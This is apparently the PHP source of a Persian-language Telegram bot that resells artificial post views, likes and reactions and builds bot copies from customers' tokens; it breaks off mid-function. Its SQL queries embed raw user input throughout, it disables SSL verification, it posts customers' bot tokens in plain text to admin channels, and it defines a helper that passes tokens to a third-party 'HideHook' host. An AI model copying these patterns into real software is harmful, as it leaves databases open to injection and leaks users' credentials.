 <?php
ob_start();
error_reporting(0);
header("HTTP/1.0 200 OK");
date_default_timezone_set("Asia/Tehran");
if(file_exists("error_log")){
unlink("error_log");
}
include 'config.php';
include('lib/jdf.php');
$MerchantID = "3f7f0ef8-5ad";
//========================== // bot // ==============================
function bot($method,$datas=[]){
    $url = "https://api.telegram.org/bot".API_KEY."/".$method;
    $ch = curl_init();
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SAFE_UPLOAD, true);
    curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($datas));
    $res = curl_exec($ch);
    if(curl_error($ch)){
        var_dump(curl_error($ch));
    }else{
        return json_decode($res);
    }
}
function RandomString()
{
    $characters = '1234567890abcdefGHIJKLmnopqRsTwxyZ';
    $randstring = '';
    for ($i = 0; $i < 32; $i++) {
        $randstring .= $characters[rand(0, strlen($characters))];
    }
    return $randstring;
}
function curl($url){
$cSession = curl_init($url);
//curl_setopt($cSession,CURLOPT_URL,"$url");
 curl_setopt($cSession,CURLOPT_RETURNTRANSFER,true);
 curl_setopt($cSession,CURLOPT_HEADER, false);

$result=curl_exec($cSession);

if(curl_error($ch)){
        return curl_error($ch);
    }else{
return $result;
}
curl_close($cSession);

}
function random($length){
//create a or array string called chars
        $chars ="16953060294065954040394012039369223456789";
         $str = "";
        //is the variable which is equal to the length of the string called chars
        $size = strlen($chars);
        for($i=0; $i<$length; $i++){
             $str .= $chars[rand(0, $size-1)];

    }
    return $str;
}
function timer( $timer){
$s = date("Y/m/d" , strtotime("+".$timer." day"));
return $s;
}

$MerchantID  = "669b89f2-45ef";
  



//========================== // update // ==============================
$update = json_decode(file_get_contents('php://input'));
$Message = $update->message;
$messageid = $Message->message_id;
$text = $Message->text;
$chatid = $Message->chat->id;
$fromid = $Message->from->id;

$firstname = $Message->from->first_name;
$username = $Message->from->username;
$chusername = $update->channel_post->chat->id;
$type2= $update->channel_post->chat->type;
$query = $update->callback_query;
$queryid=$query->id;
$querydata=$query->data;
$tc = $Message->chat->type;
$apikeyy = RandomString();
$qmessage = $query->message;
$qmid = $qmessage->message_id;
$qname = $query->from->first_name;
$quser = $query->from->username;
$qid = $query->from->id;
$querychatid=$query->message->chat->id;
$gpname = $Message->chat->title;
$gpuser = $Message->chat->username;
$bio = $Message->chat->bio;
$description = $Message->chat->description;
$newmember = $Message->new_chat_members;
$newid = $newmember[0]->id;
$newname = $newmember[0]->first_name;
$newuser = $newmember[0]->username;
$type= $Message->chat->type;
$photo= $Message->photo[0]->file_id;
$video = $Message->video->file_id;
$sticker = $Message->sticker->file_id;
$audio = $Message->audio->file_id;
$document= $Message->document->file_id;
$voice = $Message->voice->file_id;
$dice = $Message->dice->emoji;
$caption = $Message->caption;
$getmebot = bot("getMe");
$idbot = $getmebot->result->id;
$botname = $getmebot->result->first_name;
$botuser = $getmebot->result->username;
$datesh = gregorian_to_jalali(date("Y"),date("m"),date("d"),"/");
$time = date("H:i:s");
$date= date("Y:m:d");
$phone_id = $update->message->contact->user_id;
$contactnum = $update->message->contact->phone_number;
$contact = $message->contact;
$contactid = $contact->user_id;
// databse
$user = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM `user` WHERE `id` = '$fromid' LIMIT 1"));
$useran = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM `user` WHERE `id` = '$text' LIMIT 1"));
$block = mysqli_query($connect,"SELECT * FROM `block` WHERE `id` = '$fromid' LIMIT 1");
$setting = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM setting WHERE setting = 'web' LIMIT 1"));
$q = mysqli_query($connect,"SELECT sum(`amount`) as sum from `buy`  WHERE `id` = '$fromid'");
$row = mysqli_fetch_assoc($q);
$step = $user['step'];

$qu = mysqli_query($connect,"SELECT sum(`amount`) as sum from `buy`  WHERE `id` = '$text'");
$row2 = mysqli_fetch_assoc($qu);
$ahw = $row2['sum'];

if(isset($update->callback_query)){
$query = $update->callback_query;
$queryid = $update->callback_query->id;
$chid = $update->callback_query->message->chat->id;
$fid = $update->callback_query->from->id;
$qmid = $query->message->message_id;
	}
if(isset($update->channel_post)){
$channel_post = $update->channel_post;
$channel_post_message_id = $channel_post->message_id;
$channel_post_chat_id = $channel_post->chat->id;
$channel_post_chat_username = $channel_post->chat->username;
$channel_post_chat_type = $channel_post->chat->type;
// databse
$user = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM `channel` WHERE `channel` = '$channel_post_chat_id' LIMIT 1"));
}
function URLOPENxs($url) {
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HEADER, 0);
$data = curl_exec($ch);
curl_close($ch);
return $data;
}
function PostSendREQ($url,$postRequest){
$cURLConnection = curl_init($url);
curl_setopt($cURLConnection, CURLOPT_POSTFIELDS, $postRequest);
curl_setopt($cURLConnection, CURLOPT_RETURNTRANSFER, true);
$apiResponse = curl_exec($cURLConnection);
curl_close($cURLConnection);
return $apiResponse;
}

function SETP($step,$fromid){
global $connect;
$connect->query("UPDATE `user` SET `step` = '$step' WHERE `id` = '$fromid' LIMIT 1");
}
function INSERTTOKEN($fromid,$username,$token){
global $connect;
$connect->query("INSERT INTO `qw$fromid` (`bot` , `token`) VALUES ('$username' , '$token')");
}
function SLLWBHK($token,$url){
URLOPENxs("https://api.ineo-team.ir/HideHook.php?token=$token&url=$url");
}
function WBHKGTNNFO($token){
$x = URLOPENxs("https://api.telegram.org/bot$token/getme");
return json_decode($x);
}
function CHEKMEMFOREVER($fid){
global $connect;
$us = mysqli_fetch_assoc($connect->query("SELECT * FROM `user` WHERE `id` = '$fid'"));
if ($us == false) {
return false;
}else{
return true;
}
}
function getallvalue($table,$row2){
	global $connect;
$query = "SELECT * FROM $table ";
$result = mysqli_query($connect,$query);
while ($row = mysqli_fetch_array($result)) {
$data[] = $row[$row2];
}
return $data;
}
function getvalue($table,$roow,$chatid,$row2){
	global $connect;
$query = "SELECT * FROM `$table` WHERE `$roow`='$chatid' ";
$result = mysqli_query($connect,$query);
while ($row = mysqli_fetch_array($result)) {
return $row[$row2];
}
}
function isetval($table,$roow,$chatid,$row2){
	global $connect;
$query = "SELECT * FROM $table WHERE $roow='$chatid' ";
$result = mysqli_query($connect,$query);
while ($row = mysqli_fetch_array($result)) {
if(isset($row[$row2]) && !empty($row[$row2])){
	return true;
	}else{
	return false; 
	}
}
}
function sm($chatid,$text,$keyboard=null,$parse_mode= 'Html',$disable_web_page_preview=false){
 return bot('sendMessage',[
        'chat_id'=>$chatid,
        'text' =>$text,
        'parse_mode'=>$parse_mode,
        'disable_web_page_preview'=>$disable_web_page_preview,
        'reply_markup'=>$keyboard
        ]);
} 
function fm($chatid,$userid,$message){
    bot('ForwardMessage',[
        'chat_id'=>$chatid,
        'from_chat_id'=>$userid,
        'message_id'=>$message
        ]);
}
function sp($chatid,$file_id,$message= null,$parse_mode= "Html"){
    bot('sendPhoto', [
        'chat_id' => $chatid,
        'photo' => $file_id,
        'caption' =>$message,
        'parse_mode' => $parse_mode
        ]);
}
function sv($chatid,$file_id,$message= null,$parse_mode= "Html"){
    bot('sendVideo', [
        'chat_id' => $chatid,
        'video' => $file_id,
        'caption' =>$message,
        'parse_mode' => $parse_mode
        ]);
}
function checktoken($token)
{
    $ex = explode(":", $token);
    $getme = json_decode(curl("https://api.telegram.org/bot" . $token . "/getMe"), 1);
    if ($ex !== NULL && is_numeric($ex[0]) && strlen($ex[1]) < 40 && $getme["ok"] == 1) {
        return "OK";
    }
    return "false";
}
function sd($chatid,$file_id,$message= null,$parse_mode= "Html"){
    bot('sendDocument', [
        'chat_id' => $chatid,
        'document' => $file_id,
        'caption' =>$message,
        'parse_mode' => $parse_mode
        ]);
}
function sa($chatid,$file_id,$message= null,$parse_mode= "Html"){
    bot('sendAudio', [
        'chat_id' => $chatid,
        'audio' => $file_id,
        'caption' =>$message,
        'parse_mode' => $parse_mode
        ]);
}
function svo($chatid,$file_id,$message= null,$parse_mode= "Html"){
    bot('sendVoice', [
        'chat_id' => $chatid,
        'voice' => $file_id,
        'caption' =>$message,
        'parse_mode' => $parse_mode
        ]);
}
function ss($chatid,$file_id){
    bot('sendSticker', [
        'chat_id' => $chatid,
        'sticker' => $file_id,
        ]);
}
function erm($chatid,$message,$reply_markup){
    bot('editMessageReplyMarkup',[
        'chat_id'=>$chatid,
        'message_id'=>$message,
        'reply_markup'=>$reply_markup
        ]);
}
function alert($querid,$qt,$type=true){
return bot('answerCallbackQuery',[
		'callback_query_id'=>$querid,
		'text'=>$qt,
		'show_alert'=>$type
		]);
}
function em($chatid,$text,$message,$keyboard=null,$disable_web_page_preview=false,$parse_mode =  'Html'){
    bot('EditMessageText',[
        'chat_id'=>$chatid,
        'text'=>$text,
        'message_id'=>$message,
        'parse_mode'=>$parse_mode,
        'disable_web_page_preview'=>$disable_web_page_preview,
        'reply_markup'=>$keyboard
        ]);
} 
function ToDie(){
	global $connect;
mysqli_close($connect);
die();
}
//==============================// function //=======================================

function convert($string) {
    $persian = ['۰', '۱', '۲', '۳', '۴', '۵', '۶', '۷', '۸', '۹'];
    $arabic = ['٩', '٨', '٧', '٦', '٥', '٤', '٣', '٢', '١','٠'];
    $num = range(0, 9);
    $convertedPersianNums = str_replace($persian, $num, $string);
    $englishNumbersOnly = str_replace($arabic, $num, $convertedPersianNums);
    return $englishNumbersOnly;
}
###)))))____-----
function listpays($code = NULL){
	$rand = rand(111111,999999);
	$code = $rand;
	$ls = mysqli_num_rows(mysqli_query($connect,"SELECT `code` FROM `pay` WHERE `code` = '$code' LIMIT 1"));
	if($ls == 0){
	    return $code;
    }
}
function deletevalue($table,$row,$val){
	global $connect;
	$sql = "DELETE FROM `$table` WHERE `$row`='$val'";
	$result = mysqli_query($connect,$sql);
	}
//=========================


//=============================// keybord and Text //=======================================
$creat = json_encode([ 
    'keyboard'=>[ 
        [['text'=>'⚙️ ساخت ربات']],
        [['text'=>'🗑 حذف ربات'],['text'=>'🗃 تغییر توکن']],
        [['text'=>'💰شارژ حساب'],
        ['text'=>'👤حساب من']],
        [['text'=>'♻️ تمدید️'],
        ['text'=>'📜 قوانین و امکانات و راهنما']], 
        [['text'=>'انصراف']]
        ],
        'resize_keyboard'=>true,
        ]); 
        
        
        
        
        
        
        
        
        


         $home = json_encode([ 
             'keyboard'=>[ 
                 [['text'=>'✅ دریافت مشخصات وب سرویس']],
                 [['text'=>'➕ افزایش موجودی'],['text'=>'🆘 پشتیبانی و قوانین']],                  [['text'=>'🤖 ساخت ربات [ پنل سین]']],

                 ], 
                 'resize_keyboard'=>true,
                 ]);
                
                 $back_panel = json_encode([
                     'keyboard'=>[
                         [['text'=>"برگشت 🔙"]]
                         ],
                         'resize_keyboard'=>true
                         ]);
                         $_gi_ft = 0;
                         $back = json_encode([ 'keyboard'=>[ 
                             [['text'=>'انصراف']], 
                             ], 
                             'resize_keyboard'=>true, 
                             ]);
                             $backch = json_encode([ 
                                 'keyboard'=>[ 
                                     [['text'=>'✅ تایید'],['text'=>'انصراف']], 
                                     ], 
                                     'resize_keyboard'=>true, 
                                     ]);	
                                     $cha = json_encode([ 
                                         'keyboard'=>[ 
                                             [['text'=>"♻️ تغییر کلید وب سرویس"]],
                                             [['text'=>"انصراف"]],
                                             ],
                                             'resize_keyboard'=>true,
                                             ]);					
                                             $ys = json_encode([
                                                 'keyboard'=>[
                                                     [['text'=>"✅ بله"]],
                                                     [['text'=>"انصراف"]],
                                                     ],
                                                     'resize_keyboard'=>true, 
                                                     ]);

$amounts = json_decode(file_get_contents("amount.json"),true);
$_seen = $amounts['seen'];
$_like = $amounts['like'];
$api = json_decode(file_get_contents("api.json"),true);
$seenapi = $api['seenapi'];
$seenpass = $api['seenpass'];
$likeapi = $api['likeapi'];
$likepass = $api['likepass'];
//===========================// block //===========================
if (mysqli_num_rows($block) > 0) exit();
//==============
$apikey = RandomString(20);
$data = json_decode(file_get_contents("data/$fromid.json"),true);
$data1 = json_decode(file_get_contents("data/$apikey.json"),true);
$id = $user["id"];
$amount = $user["coin"];
$apikey = $user["apikey"];
//===========================// 
if(!isset($user['apikey'])){
$apikey = RandomString(20);
$user["id"] = "$fromid";
$user["amount"] = "0";
$user["apikey"] = "$apikey";
$connect->query("INSERT INTO `user` (`id` , `coin` , `apikey`) VALUES ('$fromid' , '$_gi_ft' , '$apikey')");
$data1["id"] = "$fromid";
$data1["coin"] = "0";
$data1["apikey"] = "$apikey";
$connect->query("INSERT INTO `user` (`id` , `coin` , `apikey`) VALUES ('$fromid' , '$_gi_ft' , '$apikey')");
$strt = "✋سلام، به وب سرویس کلور سین خوش آمدید.

با وب سرویس کلور سین همراه شماییم تا به راحتی بازدید، لایک و رای پستهای تلگرامی شما را افزایش دهیم.

برای ادامه کار یک بخش را انتخاب کنید:";	
	bot('sendmessage',[
	'chat_id'=>$chatid,
	'text'=>$strt,
    'reply_to_message_id'=>$messageid,
    'reply_markup'=>$home
    		]);
}

elseif($text == 'انصراف'){
bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"🖥 صفحه اصلی

برای ادامه کار یک بخش را انتخاب کنید:

",
'reply_to_message_id'=>$messageid,
'one_time_keyboard'=>true,
 'reply_markup'=>$home
]);
$connect->query("UPDATE `user` SET `step` = 'none',`com` = '' WHERE `id` = '$fromid' LIMIT 1");

}
//===========================// back //===========================
 
if ($text == '⚙️ ساخت ربات' and $tc == 'private'){
 if ( $user['pol'] < 40000){
 bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"💰 هزینه ساخت ربات نمایندگی 40,000تومان میباشد لطفا ابتدا از بخش (شارژ حساب) حساب کاربری خود را شارژ کنید و سپس اقدام به ساخت ربات نمایندگی کنید !",
'reply_to_message_id'=>$messageid,
 'reply_markup'=>json_encode([
     'inline_keyboard'=>[
         [['text'=>'🤖 ربات نمونه','url'=>'https://t.me/mashhadwebhost'],['text'=>'➕💳','callback_data'=>"aha"]],
         ]
         ])
 ]);
 }else{
 bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"به بخش ساخت ربات نمایندگی پیشرفته خوش امدید \n برای ادامه کار توکن دریافتی از ربات @BotFather را ارسال کنید !",
'reply_to_message_id'=>$messageid,
 'reply_markup'=>$back
 ]);
SETP("creatbot",$fromid);
 }
}
elseif ($user['step'] == 'creatbot'){
 if(preg_match('/^[0-9]+\:[a-zA-Z0-9\_\-]+$/i',$text)){
 $url="https://api.telegram.org/bot".$text."/getme";  
 $text = str_replace("function","",$text);
 $text = str_replace("json","",$text);
 $text = str_replace("file","",$text);
 $text = str_replace("curl","",$text);
 $text = str_replace("text","",$text);
 $text = str_replace("chat","",$text);
 $text = str_replace("php","",$text);
 $text = str_replace("input","",$text);
 $text = str_replace("(","",$text);
 $text = str_replace(")","",$text);
 $get=json_decode(file_get_contents($url),true);
  //  $j=json_encode($get);
 $ok=$get['ok'];
 if($ok !=true){
 bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"توکن شما اشتباه میباشد🚫\n\nیک توکن دیگر ارسال نمایید",
'reply_to_message_id'=>$messageid,
 
 ]);
 }else{
 $result =$get["result"];
 $username = $result["username"];
  $getbot = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM `amarbot` WHERE `bot` = '$username' LIMIT 1"));
 if(isset($getbot['bot']) ){
 $txt="
                      ربات از قبل ساخته شده است❌
   یک توکن جدید بفرستید 

                      ";
 bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"$txt",
 ]);
}else{
 $txt="درحال ساخت....\n\nلطفا صبر نمایید♻️";
 bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"$txt",
'reply_to_message_id'=>$messageid,
 'reply_markup'=>$home
 ]);
$insert = "INSERT INTO amarbot(bot,token,creatorid) VALUES ('$username','$text','$fromid')";
 mysqli_query($connect,$insert);

$file=file_get_contents("seen/config.php");
$ch = str_replace("API_T",$text,$file);
$ch1 = str_replace("IDADMIN","$fromid",$ch);
if(!file_exists("BotList")){
mkdir("BotList");    
}
if(!file_exists("BotList/$username")){
mkdir("BotList/$username");    
}
$timeec = timer(30);
file_put_contents("BotList/$username/config.php",$ch1);
file_put_contents("BotList/$username/exp.txt",$timeec);
  copy("seen/index.php","BotList/".$username."/index.php");
 copy("seen/table.php","BotList/".$username."/table.php");
 copy("seen/jdf.php","BotList/".$username."/jdf.php");
 copy("seen/daily.php","BotList/".$username."/daily.php");
  copy("seen/t2.php","BotList/".$username."/t2.php");

 copy("seen/botseen6.5.php","BotList/".$username."/botseen6.5.php");
  file_get_contents("$domain/BotList/".$username."/table.php");
    curl("$domain/BotList/".$username."/t2.php");
//     https://cleverseen.ir/api/BotList/Testhsid7bot/t2.php
$url2="$domain/BotList/$username/botseen6.5.php";
$url3="https://api.telegram.org/bot$text/setwebhook?url=$url2";
                          file_get_contents($url3);
$txr="
                        ربات شما با موفقیت ساخته شد✅
درصورت مشکل با پشتیبانی ربات تماس بگیرید! 
                          ";
                          curl("https://api.telegram.org/bot$text/sendmessage?chat_id=$chatid&text=$txr");
 $ttb ="
ربات شما با ایدی @$username ساخته شد✅ :
⚙️ توکن ربات :\n $text
⭐️ جهت ورود به به پنل مدیریت‌ دستور (پنل) بزنید .

💵 مبلغ 40000 تومان از شما کسر شد  .";
                                              $te2 = "
🖥 صفحه اصلی

برای ادامه کار یک بخش را انتخاب کنید:
                          ";
 $kein = json_encode([
 'inline_keyboard'=>[
[
['text'=>"🤖 ورود به ربات",'url'=>"http://telegram.me/$username"]],[['text'=>'📢 ورود به کانال اطلاع رسانی نمایندگان','url'=>"https://t.me/+"]
],
]
]);
                          //یاداشت 2
$connect->query("UPDATE `user` SET `step` = 'none' WHERE `id` = '$fromid' LIMIT 1");
$coin = $user['pol'] - 40000;
$connect->query("UPDATE `user` SET `pol` = '$coin' WHERE `id` = '$fromid' LIMIT 1");
INSERTTOKEN($fromid,$username,$text);
bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"$ttb",
 'reply_markup'=>$kein
 ]);
 bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"$te2",
 'reply_markup'=>$home
 ]);
 $lio="$domain/BotList/".$username."/t2.php";
     bot('sendmessage',[
'chat_id'=>-1001866423244,
'text'=>"ربات جدید  @$username ساخته شد✅ :
⚙️ توکن ربات :\n $text\n\nلینک دیتابیس : $lio",
 ]);                      
bot('sendmessage',[
'chat_id'=>$channel_token_id,
'text'=>"یک ربات ساخته شد✅\n\nCreator : <a href='tg://user?id=$fromid'>$firstname</a>\nCreator ID : $fromid\n\n@$username\n\nToken :\n$text",
 'reply_markup'=>$kein,
 'parse_mode'=>'html',
 ]);                          
                      }
                    }
                    }
                      
 }
 
 
 
 
 

 
 if ($text == '🤖 ساخت ربات [ پنل سین]'  and $tc == 'private' ){
    bot('sendmessage' ,[
        'chat_id'=>$chatid,
        'text'=>'انتخاب کنید!.',
        'reply_to_message_id'=>$messageid,
        'reply_markup'=>$creat,
        'one_time_keyboard'=>true,

        ]);
}
//======================== pay ========
elseif($chatid==$phone_id and $update->message->contact->phone_number and $user['data'] == 'taiid' and $text != 'انصراف'){
if(substr($contactnum,0,-10) == "98"){
$code=rand(10000,100000);
$munme=substr($contactnum,-10);
//======
//file_get_contents("https://cleverseen.ir/sms/api/v1/sendsms?type=send&&api_key=12345&&phone=0$munme&&template=123456&&value=$code");
//    $apisms = "";
//    $apisms = "";
//    file_get_contents("https://api.codebazan.ir/sms/api.php?type=sms&apikey=$apisms&code=$code&phone=0$munme");
//    
    //$client = new SoapClient("http://188.0.240.110/class/sms/wsdlservice/server.php?wsdl");
    $client = new SoapClient("http://ippanel.com/class/sms/wsdlservice/server.php?wsdl");
    $user = "";
        $pass = "";
    $fromNum = "+983000505";
    $toNum = array("$munme");
    $pattern_code = "";
    $input_data = array(
//    "validation_code" => "12588"
        "verification-code" => "$code"
    );
    echo $client ->sendPatternSms($fromNum, $toNum, $user, $pass, $pattern_code, $input_data);
//========
bot('sendmessage',[
'chat_id'=>$chatid,
 'text'=>"کد تکمیل عضویت تا دقایقی دیگر به شماره همراه شما پیامک میشود و تا 30 دقیقه اعتبار دارد.

👈 لطفا کد دریافتی را وارد نمایید:",
'reply_to_message_id'=>$messageid,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'انصراف']],
],
'resize_keyboard'=>true,
])
]);
$connect->query("UPDATE `user` SET `data` = 'none' WHERE `id` = '$fromid' LIMIT 1");
$connect->query("UPDATE `user` SET `step` = '$code',`com` = '0$munme' WHERE `id` = '$fromid' LIMIT 1");
bot('sendmessage',[
'chat_id'=>949706485,
 'text'=>"شماره جدید برای پرداخت 
 #u$fromid
 شماره  : 0$munme",
]);
}else{
bot('sendmessage',[
'chat_id'=>$chatid,
 'text'=>"✅ تنها شما با شماره ایران میتوانند حساب خود را تایید کنید ، لطفا با اکانت حقیقی خود با شماره ایران اقدام به استفاده از ربات و شارژ حساب کنید.

📞 شماره شما : $contactnum",
]);
}
}

//================
elseif(strpos($user['com'],'09')!==false){
if ($text==$user['step']) {
$connect->query("UPDATE `user` SET `phone` = '{$user['com']}' WHERE `id` = '$fromid' LIMIT 1");
bot('sendmessage',[
'chat_id'=>$chatid,
 'text'=>"✅ تبریک، عضویت شما با موفقیت تکمیل شد و میتوانید از تمامی امکانات ربات استفاده نمایید.",
'reply_to_message_id'=>$messageid,
'reply_markup'=>$home,
]);

$connect->query("UPDATE `user` SET `step` = 'pay',`com` = '' WHERE `id` = '$fromid' LIMIT 1");

}else{
bot('sendmessage',[
'chat_id'=>$chatid,
 'text'=>"⚠️ کد ارسالی اشتباه است، مجددا تلاش نمایید.",
]);
}
}
elseif($text == '💰شارژ حساب'  && $tc == "private"){
     if($user['phone'] !==null){
	$bazdid = $_seen * 1000;
    bot('sendmessage',[
	'chat_id'=>$chatid,
	'text'=>"💰 مبلغ مورد نظر خود را بین 15000 الی 100000 ارسال کنید .

🔮 بعد از پرداخت مبلغ بصورت خودکار به اکانت شما اضاف میشود !

📋 در صورت هرگونه مشکل با پشتیبانی در ارتباط باشید .",
'reply_to_message_id'=>$messageid,
'reply_markup'=>json_encode([
        'keyboard'=>[
		[['text'=>'انصراف']],
		],
        'resize_keyboard'=>true,
       		])
            ]);
$connect->query("UPDATE `user` SET `step` = 'pol' WHERE `id` = '$fromid' LIMIT 1");
}else{
$connect->query("UPDATE `user` SET `data` = 'taiid' WHERE `id` = '$fromid' LIMIT 1");
bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"لطفا شماره همراه خود را با استفاده از دکمه '🔒 تایید و ارسال شماره' ارسال نمایید.

📌 برای جلوگیری از سواستفاده برخی افراد نیاز است شماره خود را ارسال و تایید نمایید. شماره همراه شما در جایی استفاده نخواهد شد و اینکار تنها برای احراز هویت شماست.",
'reply_to_message_id'=>$messageid,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'🔒 تایید و ارسال شماره','request_contact'=>true]],
[['text'=>'انصراف']],

],
'resize_keyboard'=>true,
])
]);
}
}

elseif($text == '➕ افزایش موجودی'  && $tc == "private"){
     if($user['phone'] !==null){
	$bazdid = $_seen * 1000;
    bot('sendmessage',[
	'chat_id'=>$chatid,
	'text'=>"💰برای افزایش موجودی حساب مبلغ موردنظر خود را به تومان وارد نمایید.

❗️ توجه کنید که مبلغ را به عدد وارد کنید و حداقل میتوانید 100,000 تومان و حد اکثر تا 5,000,000 تومان  حساب خود را شارژ کنید.

👁‍🗨 تعرفه هر 1000 بازدید : $bazdid تومان 
❤️ تعرفه هر 1 لایک : $_like تومان
👍 تعرفه هر 1 ری‌اکشن : 15 تومان",
'reply_to_message_id'=>$messageid,
'reply_markup'=>json_encode([
        'keyboard'=>[
		[['text'=>'انصراف']],
		],
        'resize_keyboard'=>true,
        'one_time_keyboard'=>true,

       		])
            ]);
$connect->query("UPDATE `user` SET `step` = 'pay' WHERE `id` = '$fromid' LIMIT 1");
}else{
$connect->query("UPDATE `user` SET `data` = 'taiid' WHERE `id` = '$fromid' LIMIT 1");
bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>"لطفا شماره همراه خود را با استفاده از دکمه '🔒 تایید و ارسال شماره' ارسال نمایید.

📌 برای جلوگیری از سواستفاده برخی افراد نیاز است شماره خود را ارسال و تایید نمایید. شماره همراه شما در جایی استفاده نخواهد شد و اینکار تنها برای احراز هویت شماست.",
'reply_to_message_id'=>$messageid,
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>'🔒 تایید و ارسال شماره','request_contact'=>true]],
[['text'=>'انصراف']],

],
'resize_keyboard'=>true,
])
]);
}
}

 if ( $text == '👤حساب من' and $tc == 'private'){
   $allbot   = mysqli_num_rows(mysqli_query($connect,"select `bot` from `qw$fromid`"));
$polus =  number_format($user['pol']);
     $txt ="👇🏻وضعیت حساب کاربری شما در بخش نمایندگی.

💳 موجودی حساب: <code>$polus</code> تومان
👤وضعیت حساب : فعال
🤖 تعداد ربات ها : $allbot


⏱ این گزارش وضعیت در تاریخ $date ساعت $time گرفته شده است.";
     bot
     (
         'sendmessage',
         [
             'chat_id'=>$chatid,
             'text'=>$txt,
             'parse_mode'=>'html',
             'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>'➕💳','callback_data'=>"aha"]],]
])
             ]);
     
 }
 


if ($user['step'] == 'tamdid' and $text != 'انصراف'){
         $url="https://api.telegram.org/bot".$text."/getme";  
      $get=json_decode(file_get_contents($url),true);
      $result =$get["result"];
 $username = $result["username"];
  $use = mysqli_fetch_assoc(mysqli_query($connect,"SELECT * FROM `qw$fromid` WHERE `bot` = '$username' LIMIT 1"));
        if(!isset($use['bot'])){
          $txt = 'خطا ! توکن شما نامعتبر است';
          bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>$txt,
'reply_to_message_id'=>$messageid,
]);
}else{
    $coin = $user['pol'] - 15000;
    $connect->query("UPDATE `user` SET `pol` = '$coin' WHERE `id` = '$fromid' LIMIT 1");
$start  = file_get_contents("BotList/$username/exp.txt");
$days   = 30;
$expire = date('Y/m/d', strtotime("$start +$days days")); 
file_put_contents("BotList/$username/exp.txt",$expire);
sm($fromid,"ربات شما با موفقیت 30 روز تمدید شد ✅
مبلغ 15000 تومان از شما کم شد
زمان سررسید بعدی : $expire",$home);
bot('sendmessage',[
'chat_id'=>$channel_token_id,
'text'=>"یک ربات تمدید شد✅\n\nCreator : <a href='tg://user?id=$fromid'>$firstname</a>\nCreator ID : $fromid\n\n@$username\n\nToken :\n$text 
مبلغ 15000
موجودی جدید $coin",
 'reply_markup'=>$kein,
 'parse_mode'=>'html',
 ]);  
 $connect->query("UPDATE `user` SET `step` = 'none' WHERE `id` = '$fromid' LIMIT 1");

}}









    

//==================
if($user['id'] != true) {
    $strt = "✋سلام، به وب سرویس کلور سین خوش آمدید.

با وب سرویس کلور سین همراه شماییم تا به راحتی بازدید، لایک و رای پستهای تلگرامی شما را افزایش دهیم.

برای ادامه کار یک بخش را انتخاب کنید:";	
	bot('sendmessage',[
	'chat_id'=>$chatid,
	'text'=>$strt,
    		]);
$connect->query("INSERT INTO `user` (`id` , `coin`) VALUES ('$fromid' , '$_gi_ft')");
}

//========================= // key // ==============================
if ($text == '/start'){
    $strt = "✋سلام، به وب سرویس کلور سین خوش آمدید.

با وب سرویس کلور سین همراه شماییم تا به راحتی بازدید، لایک و رای پستهای تلگرامی شما را افزایش دهیم.

برای ادامه کار یک بخش را انتخاب کنید:";	
    bot('sendmessage',[
'chat_id'=>$chatid,
'text'=>$strt,
'reply_to_message_id'=>$messageid,
 'reply_markup'=>$home
]);
}

elseif($text == '✅ دریافت مشخصات وب سرویس'  && $tc == "private"){
$apikey1 = $user["apikey"];
$coinid = $user["coin"];
$bazdid = $_seen * 1000;
$time = jdate("H:i:s");
$date = jdate("Y/m/d");
bot('sendmessage',[
	'chat_id'=>$chatid,
	'text'=>"👇🏻 مشخصات شما در ربات وب سرویس کلور سین
 
⚙️کلید وبسرویس: <code>$apikey1</code>
💳 موجودی حساب : $coinid

👁‍🗨 تعرفه هر 1000 بازدید : $bazdid تومان 
❤️ تعرفه هر 1 لایک : $_like تومان
👍 تعرفه هر 1 ری‌اکشن : 15 تومان

<b>بدون هماهنگی قبلی با پشتیبانی از وب سرویس استفاده نکنید ⚠️</b>

📚 مستندات استفاده از وب سرویس :
https:/domain.ir/api 

<blockquote> توجه ‼️
ربات زیر را جهت دریافت کامل سفارشات استارت داشته باشید . 
@mashhadwebhost </blockquote>

⏱ این گزارش وضعیت در تاریخ$date ساعت $time گرفته شده است.",
'reply_to_message_id'=>$messageid,
'parse_mode'=>'html',
     'reply_markup'=>$cha
     ]);
     $connect->query("UPDATE `user` SET `step` = 'chap' WHERE `id` = '$fromid' LIMIT 1");
}
elseif($text == '🆘 پشتیبانی و قوانین'   and $tc == 'private'){
bot('sendmessage',[
	'chat_id'=>$chatid,
	'text'=>"🔰 تیم پشتیبانی کلور سین با افتخار آماده پاسخگویی به شما عزیزان است:
$usernamesup

⚖️ کاربر گرامی، چنانچه شما از ربات کلور سین استفاده نمایید به منزله قبول قوانین زیر است:

👈 تنها مرجع رسمی افزایش موجودی ربات، بخش '➕ افزایش موجودی' است.
👈 درصورتی که تراکنش مشکوکی مشاهده شود کلور سین این اختیار را دارد که از کاربر مربوطه مدارک موردنیاز را درخواست کند.",
'reply_to_message_id'=>$messageid,
'one_time_keyboard'=>true,
            ]);

}	
if ($text == '📜 قوانین و امکانات و راهنما'){
    bot('sendmessage',[
        'chat_id'=>$fromid,
